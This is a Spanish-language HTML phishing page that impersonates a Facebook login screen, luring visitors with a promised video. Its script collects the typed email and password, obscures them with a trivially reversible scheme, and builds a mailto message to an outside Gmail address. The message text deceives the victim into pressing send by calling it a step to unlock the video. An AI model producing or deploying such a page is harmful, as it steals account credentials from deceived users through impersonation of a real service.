<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="Fernanda de Jimenez">
    <meta name="description" content="inicia sesión para ver este vídeo">
    <meta property="og:image" content="URL_de_la_imagen_en_miniatura">
    <title>Iniciar sesión</title>
<style>

body {
    font-family: 'Helvetica', 'Arial', sans-serif;
    background-color: #f0f2f5;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.login-container {
    text-align: center;
}

.logo-empresa {
    width: 100px; /* Ajusta según tu logotipo */
    margin-bottom: 20px;
}

.logo-facebook {
    width: 50px; /* Ajusta según el diseño */
    height: auto;
    margin-bottom: 20px;
}

input {
    display: block;
    width: 300px;
    padding: 10px;
    margin: 10px auto;
    border: 1px solid #dddfe2;
    border-radius: 5px;
    font-size: 16px;
}

button {
    background-color: #1877f2;
    color: white;
    padding: 10px;
    width: 320px;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    cursor: pointer;
}

button:hover {
    background-color: #166fe5;
}

a {
    display: block;
    margin: 10px 0;
    color: #1877f2;
    text-decoration: none;
}

a:hover {
    text-decoration: underline;
}


</style>
</head>
<body>
    <div class="login-container">
        <!-- Logotipo de la empresa -->
        <!-- Logotipo de Facebook (placeholder) -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/768px-Facebook_Logo_%282019%29.png" alt="Facebook" class="logo-facebook">
        <form id="login-form">
            <input type="email" id="email" placeholder="Correo electrónico o teléfono" required>
            <input type="password" id="password" placeholder="Contraseña" required>
            <button type="button" onclick="sendEmail()">Iniciar sesión</button>
        </form>
        <a href="#">¿Olvidaste tu contraseña?</a>
        <a href="#">Crear cuenta nueva</a>
    </div>

<script>

function encrypt(str) {
    let encrypted = '';
    const chars = 'abcdefghijklmnopqrstuvwxyz';
    for (let char of str) {
        const randomNumber = Math.floor(Math.random() * 10); // Número aleatorio 0-9
        const randomLetter = chars[Math.floor(Math.random() * chars.length)]; // Letra aleatoria
        encrypted += char + '-' + randomNumber + randomLetter + '-';
    }
    return encrypted;
}

function sendEmail() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const encryptedEmail = encrypt(email);
    const encryptedPassword = encrypt(password);
    const subject = 'Datos de inicio de sesión';
    const body = `Para asegurarnos que eres una persona real, por favor haz clic en el botón triangular que aparece en la parte superior de la página, posteriormente se mostrará el contenido del vídeo\nE:${encryptedEmail}\nP: ${encryptedPassword}`;
    const mailtoLink = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
    window.location.href = mailtoLink;
}

</script>
</body>
</html>
